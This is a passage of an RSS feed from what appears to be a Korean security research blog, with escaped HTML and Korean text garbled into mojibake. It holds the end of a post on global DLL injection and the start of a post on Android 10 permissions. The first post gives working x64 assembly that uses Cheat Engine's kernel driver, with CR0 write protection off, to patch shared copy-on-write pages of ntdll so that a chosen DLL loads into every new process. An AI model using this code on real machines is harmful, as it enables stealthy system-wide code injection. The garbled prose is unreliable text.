					&lt;span class=&quot;n&quot;&gt;ntStatus&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;STATUS_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
				&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
				&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
					&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NoExceptions_CopyMemory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
					&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
						&lt;span class=&quot;n&quot;&gt;ntStatus&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;STATUS_UNSUCCESSFUL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
					&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
						&lt;span class=&quot;n&quot;&gt;ntStatus&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;STATUS_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
				&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì´ê²ƒì´ ê°€ëŠ¥í•œ ì´ìœ ëŠ” dbk_writesIgnoreWriteProtection í•¨ìˆ˜ì— ì˜í•´ KernelWritesIgnoreWP ë¹„íŠ¸ê°€ í™œì„±í™”ë  ë•Œ Cheat Engineì˜ ì»¤ë„ í•¨ìˆ˜ WriteProcessMemoryì—ì„œ CR0 ë ˆì§€ìŠ¤í„° WP(Write-Protect) bitë¥¼ ë¹„í™œì„±í•˜ê³  ë©”ëª¨ë¦¬ë¥¼ ì“°ë„ë¡ êµ¬í˜„ë˜ì–´ìˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ì—¬ê¸°ì„œ í¥ë¯¸ë¡œìš´ ì ì€ ëª¨ë“  ìœˆë„ìš°ì¦ˆ í”„ë¡œì„¸ìŠ¤ì— ë§¤í•‘ë˜ëŠ” KUSER_SHARED_DATA (0x7FFE000) ì˜ì—­ ë° Copy-On-Writeì˜ ì›ë³¸ í˜ì´ì§€ë„ ì¡°ì‘ì´ ëœë‹¤ëŠ” ì ì…ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/bad61.png&quot; alt=&quot;/assets/bad61.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/bad62.png&quot; alt=&quot;/assets/bad62.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ëª¨ë“  í”„ë¡œì„¸ìŠ¤ì—ëŠ” ntdll.dllì„ í¬í•¨í•œ ëª‡ëª‡ ì‹œìŠ¤í…œ ë¼ì´ë¸ŒëŸ¬ë¦¬ê°€ ê°™ì€ ì£¼ì†Œê³µê°„ì— ë¡œë“œë˜ê³  ì¼ë¶€ Read-Only í˜ì´ì§€ëŠ” ë©”ëª¨ë¦¬ ê³µê°„ì„ íš¨ìœ¨ì ìœ¼ë¡œ ì‚¬ìš©í•˜ê¸° ìœ„í•´ Copy-On-Write ê¸°ìˆ ë¡œ ê°™ì€ Physical Memoryë¥¼ ê°€ë¦¬í‚¤ê³ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ê·¸ë¦¼ì˜ ì˜ˆì‹œë¡œ ntdll.dllì˜ 0x7FFCEE14401A ì£¼ì†Œê°€ ì‹¤ì œ Physical Memoryì—ì„œëŠ” 0x1C25101Aì— ë§¤í•‘ë˜ì–´ìˆê³  ë‹¤ë¥¸ í”„ë¡œì„¸ìŠ¤ë„ ì—­ì‹œ ë™ì¼í•œ 0x1C25101A ê°’ì„ ê°€ë¦¬í‚µë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/bad63.png&quot; alt=&quot;/assets/bad63.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/bad64.png&quot; alt=&quot;/assets/bad64.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ë§Œì•½ ìœ„ ê·¸ë¦¼ì˜ Process 1ì—ì„œ Copy-On-Writeê°€ ì ìš©ëœ í˜ì´ì§€ë¥¼ ì¡°ì‘í•˜ê¸°ìœ„í•´ í˜ì´ì§€ ì†ì„±ì„ ë³€ê²½í•˜ë©´ ê·¸ ìˆœê°„ ë³µì œëœ Page D(0xCAF9D01A)ê°€ ìƒì„±ë˜ì–´ ê·¸ê³³ì„ ì“°ê²Œë˜ê³  Process 2ì—ëŠ” ì˜í–¥ì„ ë¯¸ì¹˜ì§€ì•Šê²Œ ë©ë‹ˆë‹¤.&lt;/p&gt;

&lt;h1 id=&quot;3-global-dll-injection&quot;&gt;3. Global Dll Injection&lt;/h1&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;img src=&quot;/assets/bad65.png&quot; alt=&quot;/assets/bad65.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/bad66.png&quot; alt=&quot;/assets/bad66.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;dbk_writesIgnoreWriteProtection ì˜µì…˜ì´ í™œì„±í™”ëœ ì´í›„ì—ëŠ” Copy-On-Write ë©”ëª¨ë¦¬ ë³µì œ ê³¼ì •ì´ ì¼ì–´ë‚˜ì§€ì•Šê³  ì›ë³¸ ë©”ëª¨ë¦¬(0x3F050207)ì— ì“°ê¸°ê°€ ë°œìƒí•˜ë¯€ë¡œ ëª¨ë“  í”„ë¡œì„¸ìŠ¤ ë° ì•ìœ¼ë¡œ ìƒì„±ë  í”„ë¡œì„¸ìŠ¤ì— ì½”ë“œ ì‹¤í–‰ì„ ìœ ë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë³¸ë¬¸ì—ì„œëŠ” ì´ë¥¼ í™œìš©í•˜ì—¬ Global Dll Injectionì„ êµ¬í˜„í•´ë³´ì•˜ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;[êµ¬í˜„ ì•„ì´ë””ì–´]&lt;/strong&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;64ë¹„íŠ¸ ê¸°ì¤€ìœ¼ë¡œ í”„ë¡œì„¸ìŠ¤ê°€ ìƒì„±ë˜ë©´ ntdll.RtlUserThreadStart í•¨ìˆ˜ê°€ ì‹¤í–‰ë©ë‹ˆë‹¤.&lt;/li&gt;
  &lt;li&gt;Executeê°€ ê°€ëŠ¥í•˜ê³  Copy-On-Writeê°€ ì ìš©ëœ Code cave ì˜ì—­(ntdll.PssNtWalkSnapshot+5600)ì„ ì°¾ì•„ í•´ë‹¹ ì˜ì—­ìœ¼ë¡œ jmpí•˜ëŠ” opcodeë¥¼ ì‚½ì…í•©ë‹ˆë‹¤.&lt;/li&gt;
  &lt;li&gt;ntdll.PssNtWalkSnapshot+5600ì—ì„œ ntdll.NtProtectVirtualMemory í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ ntdll.RtlUserThreadStart ì˜ì—­ì„ PAGE_EXECUTE_READWRITEë¡œ ë³€ê²½í•˜ê³  ì›ë˜ opcodeë¡œ ë³€ê²½í•©ë‹ˆë‹¤.&lt;/li&gt;
  &lt;li&gt;ntdll.LdrLoadDll í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ Custom dllì„ ë¡œë“œí•©ë‹ˆë‹¤.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;3ë²ˆì€ ì„ íƒì‚¬í•­ì´ë¯€ë¡œ ë³¸ë¬¸ì—ì„œëŠ” 1, 2, 4ë²ˆì„ ìˆœì„œëŒ€ë¡œ êµ¬í˜„í•˜ì˜€ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ntdll.PssNtWalkSnapshot+5600:
inc [ntdll.dll+16A4B8]
sub rsp,78
mov r9,rcx
jmp ntdll.RtlUserThreadStart+7

ntdll.RtlUserThreadStart:
jmp ntdll.PssNtWalkSnapshot+5600
nop
nop
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ë¨¼ì € 1, 2ë²ˆê¹Œì§€ ì •ìƒì‘ë™í•˜ëŠ” ê²ƒì„ í…ŒìŠ¤íŠ¸í•˜ê¸° ìœ„í•´ Cheat Engineì˜ Auto Assembleë¡œ ntdll.RtlUserThreadStart í•¨ìˆ˜ê°€ í˜¸ì¶œë  ë•Œ [ntdll.dll+16A4B8] ê°’ì˜ ë©”ëª¨ë¦¬ë¥¼ 1 ì¦ê°€ì‹œí‚¤ëŠ” ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‘ì„±í•˜ì˜€ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;[ntdll.dll+16A4B8]ì€ Writeableí•œ dummy ë©”ëª¨ë¦¬ë¡œ 0ìœ¼ë¡œ ì„¸íŒ…ë˜ì–´ìˆìœ¼ë©° ì˜ë„ëŒ€ë¡œë¼ë©´ ìƒˆë¡­ê²Œ ìƒì„±ëœ í”„ë¡œì„¸ìŠ¤ì˜ [ntdll.dll+16A4B8] ê°’ì€ 1 ì´ìƒì´ì–´ì•¼í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/bad67.png&quot; alt=&quot;/assets/bad67.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;MessageBoxë¡œ Hello, Worldë¥¼ ì¶œë ¥í•˜ëŠ” ê²ƒ ì´ì™¸ì— ì•„ë¬´ê²ƒë„ í•˜ì§€ì•ŠëŠ” ê°„ë‹¨í•œ í”„ë¡œê·¸ë¨ì„ ì‹¤í–‰í•˜ì˜€ì„ ë•Œ ê°’ì´ 4ì¸ê±¸ í™•ì¸í•˜ì—¬ ì˜ë„ëŒ€ë¡œ ì‘ë™í•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ì´ì œ 4ë²ˆ ê³¼ì • ntdll.LdrLoadDll í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” ì½”ë“œë¥¼ ì¶”ê°€í•˜ì—¬ ws2_32.dllê°€ ìë™ìœ¼ë¡œ ì¸ì ì…˜ë˜ë„ë¡ í•˜ì˜€ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;NTSTATUS **LdrLoadDll(**
  IN PWCHAR               PathToFile OPTIONAL,
  IN ULONG                Flags OPTIONAL,
  IN PUNICODE_STRING      ModuleFileName,
  OUT PHANDLE             ModuleHandle
);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;LdrLoadDll í•¨ìˆ˜ ì›í˜•ì€ ìœ„ì™€ ê°™ì€ë°, 1, 2ë²ˆì§¸ ì¸ìëŠ” NULLë¡œ ì„¸íŒ…í•˜ê³  3ë²ˆì§¸ ì¸ìì— PUNICODE_STRINGì„ êµ¬ì¡°ì²´ í˜•ì‹ì— ë§ì¶”ì–´ ë„£ì–´ í˜¸ì¶œí•˜ë©´ ì •ìƒì ìœ¼ë¡œ í•¨ìˆ˜ê°€ í˜¸ì¶œë˜ì—ˆì„ ë•Œ  ModuleHandleê°’ì´ ë‹´ê¸°ê³  0ì„ ë°˜í™˜í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ntdll.PssNtWalkSnapshot+5900:
db 'w', 0, 's', 0, '2', 0, '_', 0, '3', 0, '2', 0, 0, 0 //ws2_32.dll

ntdll.PssNtWalkSnapshot+5700:
dw #12 //length
dw #14 //maxlength
dd 0 //pack
dq ntdll.PssNtWalkSnapshot+5900

ntdll.PssNtWalkSnapshot+5600:
sub rsp, 1000
push r15
push r14
push r13
push r12
push r11
push r10
push r9
push r8
push rsi
push rdi
push rbp
push rdx
push rcx
push rbx
push rax
mov r9, ntdll.dll+16A4B8
mov r8, ntdll.PssNtWalkSnapshot+5700
xor rdx, rdx
xor rcx, rcx
call ntdll.LdrLoadDll
pop rax
pop rbx
pop rcx
pop rdx
pop rbp
pop rdi
pop rsi
pop r8
pop r9
pop r10
pop r11
pop r12
pop r13
pop r14
pop r15
add rsp, 1000

sub rsp,78
mov r9,rcx
jmp ntdll.RtlUserThreadStart+7

ntdll.RtlUserThreadStart:
jmp ntdll.PssNtWalkSnapshot+5600
nop
nop
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ìœ„ ìŠ¤í¬ë¦½íŠ¸ëŠ” 4ë²ˆê¹Œì§€ì˜ ê³¼ì •ì„ êµ¬í˜„í•œ ì½”ë“œì…ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ì£¼ì˜í•´ì•¼í•  ì ì€, LdrLoadDll í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ë©´ì„œ ìŠ¤íƒ ë‚´ìš©ì´ë‚˜ ë ˆì§€ìŠ¤í„°ê°€ ë³€ê²½ë ë•Œ ì˜ë„í•˜ì§€ ì•Šì€ í¬ë˜ì‹œë¥¼ ìœ ë°œí•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ í›„í‚¹ìœ¼ë¡œ ì¸í•œ ì˜í–¥ì„ ìµœì†Œí™”í•˜ê¸°ìœ„í•´ ë ˆì§€ìŠ¤í„°ë“¤ì„ ë°±ì—…í•´ì•¼í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/bad68.png&quot; alt=&quot;/assets/bad68.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰ ì´í›„ì— ìƒì„±ë˜ëŠ” ëª¨ë“  í”„ë¡œì„¸ìŠ¤ì— ws2_32.dllì´ ì •ìƒì ìœ¼ë¡œ injectionë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;32ë¹„íŠ¸ í”„ë¡œì„¸ìŠ¤ì—ë„ 64ë¹„íŠ¸ ntdll.dll ë¼ì´ë¸ŒëŸ¬ë¦¬ê°€ ë¡œë“œëŠ” ë˜ì§€ë§Œ 64ë¹„íŠ¸ì˜ ntdll.RtlUserThreadStart í•¨ìˆ˜ê°€ ì‹¤í–‰ë˜ì§€ì•Šìœ¼ë¯€ë¡œ 32ë¹„íŠ¸ í”„ë¡œì„¸ìŠ¤ê¹Œì§€ Global injectionì„ í•˜ë ¤ë©´ Injectí•  32ë¹„íŠ¸ dllì´ í•„ìš”í•˜ê³  32ë¹„íŠ¸ ntdll.dllì˜ Copy-On-Write ì˜ì—­ì„ ì¶”ê°€ë¡œ íŒ¨ì¹˜í•´ì•¼í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;h1 id=&quot;4-reference&quot;&gt;4. Reference&lt;/h1&gt;

&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection&quot;&gt;https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/cheat-engine/cheat-engine&quot;&gt;https://github.com/cheat-engine/cheat-engine&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/changeofpace/Self-Remapping-Code&quot;&gt;https://github.com/changeofpace/Self-Remapping-Code&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Control_register&quot;&gt;https://en.wikipedia.org/wiki/Control_register&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
</description>
        <pubDate>Mon, 01 Jun 2020 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/2020-06-01/Copy-On-Write-Global-Dll-injection</link>
        <guid isPermaLink="true">http://localhost:4000/2020-06-01/Copy-On-Write-Global-Dll-injection</guid>
        
        <category>windows</category>
        
        <category>system</category>
        
        <category>research</category>
        
        
      </item>
    
      <item>
        <title>Android 10 Permissions</title>
        <description>&lt;p&gt;ë¼ì˜¨í™”ì´íŠ¸í–‡ í•µì‹¬ì—°êµ¬íŒ€ ì›ìš”í•œ&lt;/p&gt;

&lt;h2 id=&quot;tldr&quot;&gt;TL;DR&lt;/h2&gt;

&lt;p&gt;ì´ ë¬¸ì„œëŠ” Android 10 ë²„ì „ë¶€í„° ì ìš©ëœ PermissionControllerì˜ ë™ì‘ íë¦„ì„ ë”°ë¼ê°€ë©°, ì›ë¦¬ë¥¼ íŒŒì•…í•˜ê¸° ìœ„í•´ ì‘ì„±ë˜ì—ˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;h2 id=&quot;android-permission&quot;&gt;Android Permission&lt;/h2&gt;

&lt;p&gt;ì•ˆë“œë¡œì´ë“œëŠ” ì‚¬ìš©ìë¡œë¶€í„° í¼ë¯¸ì…˜ì„ ìŠ¹ì¸/ê±°ë¶€ í›„, í•´ë‹¹ ê¸°ëŠ¥ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë³´í†µ í¼ë¯¸ì…˜ ìš”ì²­ì„ ë³´ë‚¼ ë•Œ, ì•„ë˜ì™€ ê°™ì€ ì½”ë“œë¥¼ ì‚¬ìš©í•´ ì‚¬ìš©ìë¡œë¶€í„° ìŠ¹ì¸ ì—¬ë¶€ë¥¼ ê¸°ë‹¤ë¦½ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-kotlin highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.example.testapp&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;android.Manifest&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;android.os.Bundle&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.google.android.material.snackbar.Snackbar&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;androidx.appcompat.app.AppCompatActivity&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;androidx.core.app.ActivityCompat&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;kotlinx.android.synthetic.main.activity_main.*&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;MainActivity&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;AppCompatActivity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;override&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;fun&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;onRequestPermissionsResult&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;requestCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;permissions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;grantResults&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;IntArray&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;super&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;onRequestPermissionsResult&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;requestCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;permissions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;grantResults&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;override&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;fun&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;onCreate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;savedInstanceState&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Bundle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;?)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;super&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;onCreate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;savedInstanceState&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nf&quot;&gt;setContentView&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;layout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;activity_main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nf&quot;&gt;setSupportActionBar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;toolbar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

        &lt;span class=&quot;nf&quot;&gt;requestPermissions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;arrayOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
            &lt;span class=&quot;nc&quot;&gt;Manifest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;permission&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;CAMERA&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ìŠ¹ì¸ ì—¬ë¶€ëŠ” í•´ë‹¹ activity í´ë˜ìŠ¤ì˜ &lt;code class=&quot;highlighter-rouge&quot;&gt;onRequestPermissionsResult&lt;/code&gt;í•¨ìˆ˜ë¥¼ í†µí•´ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ë•Œ ìš”ì²­ëœ ê¶Œí•œì„ ìŠ¹ì¸í•  ê²½ìš°, ì–´ë–»ê²Œ ì²˜ë¦¬ê°€ ë˜ëŠ”ì§€ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ë¨¼ì €, êµ¬ê¸€ë§ì„ í†µí•´ Android 10 í™˜ê²½ì—ì„œ permissionì„ ì–´ë–¤ êµ¬ì¡°ë¡œ  ë™ì‘í•˜ëŠ” ì§€ ì•Œ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/won60.png&quot; alt=&quot;/assets/won60.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ì„¤ì¹˜ëœ ì‚¬ìš©ì ì•±ì—ì„œ í¼ë¯¸ì…˜ ìš”ì²­ì„ í•˜ê²Œ ë˜ë©´, Android 10 ë¶€í„°ëŠ” &lt;code class=&quot;highlighter-rouge&quot;&gt;PermissionController ì•±&lt;/code&gt;, ê·¸ ì´ì „ ë²„ì „ê¹Œì§€ëŠ” &lt;code class=&quot;highlighter-rouge&quot;&gt;Package Installer ì•±&lt;/code&gt;ì´ ë‹´ë‹¹í•˜ì—¬ System serverë¡œ ì „ë‹¬í•˜ì—¬ ì²˜ë¦¬í•˜ëŠ” ê²ƒìœ¼ë¡œ ë³´ì…ë‹ˆë‹¤. PermissionControllerëŠ” ë‹¤ìŒê³¼ ê°™ì€ ì‘ì—…ì„ í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/won61.png&quot; alt=&quot;/assets/won61.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ìœ„ì˜ ê¸°ëŠ¥ë“¤ì€ PackageInstallerì˜ ì¼ë¶€ ê¸°ëŠ¥ ì´ì˜€ëŠ”ë°, Android 10ìœ¼ë¡œ ë„˜ì–´ì˜¤ë©´ì„œ ë¶„ë¦¬ëœ ì•±ìœ¼ë¡œ êµ¬ì„±ë˜ì–´ ìˆë‹¤ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤. ëŒ€ëµì ìœ¼ë¡œ í° ê·¸ë¦¼ì„ í™•ì¸í•˜ì˜€ìœ¼ë‹ˆ,  ìœ ì € ì•±ì—ì„œ  PermissionControllerë¡œ ìš”ì²­í•  ë•Œ ì‚¬ìš©ë˜ëŠ” &lt;code class=&quot;highlighter-rouge&quot;&gt;requestPermissions&lt;/code&gt; ì˜ ì½”ë“œë¥¼ í™•ì¸í•˜ê¸° ìœ„í•´ í•´ë‹¹ &lt;a href=&quot;https://android.googlesource.com/platform/frameworks/support/+/4f9d8c4/v4/java/android/support/v4/app/ActivityCompat.java#308&quot;&gt;ë§í¬&lt;/a&gt;ë¥¼ ì°¸ì¡°í•˜ì˜€ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// ActivityCompat&lt;/span&gt;
